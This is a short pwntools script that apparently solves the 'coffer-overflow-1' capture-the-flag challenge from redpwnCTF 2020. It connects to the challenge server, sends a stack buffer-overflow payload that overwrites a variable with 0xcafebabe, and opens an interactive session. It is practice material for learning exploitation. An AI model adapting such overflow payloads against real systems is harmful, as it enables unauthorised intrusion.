from pwn import *
r=remote("2020.redpwnc.tf",31255)
#r=process("./coffer-overflow-1")
pay=""
pay+='x'*(0x20-0x8)
pay+=p32(0xcafebabe)

r.sendline(pay)

r.interactive()
